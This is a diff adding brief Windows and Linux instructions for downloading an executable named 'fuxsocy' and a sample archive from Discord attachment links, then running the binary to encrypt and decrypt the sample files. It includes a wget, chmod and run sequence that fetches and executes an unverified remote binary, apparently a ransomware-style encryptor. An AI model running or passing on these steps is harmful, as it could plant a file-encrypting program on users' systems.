@@ -1,0 +1,17 @@
+Windows: Encrypting files
+- Download: https://cdn.discordapp.com/attachments/559676586941743114/720204940332630076/fuxsocy.exe
+- Download and unzip https://cdn.discordapp.com/attachments/559676586941743114/720205016123572324/ToEncrypt.zip
+- Run fuxsocy.exe to encrypt and decrypt files from the zipfile
+
+Linux: Encrypting files
+- Download: https://cdn.discordapp.com/attachments/559676586941743114/720209711592636467/fuxsocy
+- chmod +x fuxsocy
+- Download and unzip https://cdn.discordapp.com/attachments/559676586941743114/720205016123572324/ToEncrypt.zip
+- Run fuxsocy.exe to encrypt and decrypt files from the zipfile
+
+wget https://cdn.discordapp.com/attachments/559676586941743114/720209711592636467/fuxsocy
+chmod +x fuxsocy
+wget https://cdn.discordapp.com/attachments/559676586941743114/720205016123572324/ToEncrypt.zip
+unzip ToEncrypt.zip
+./fuxsocy
+
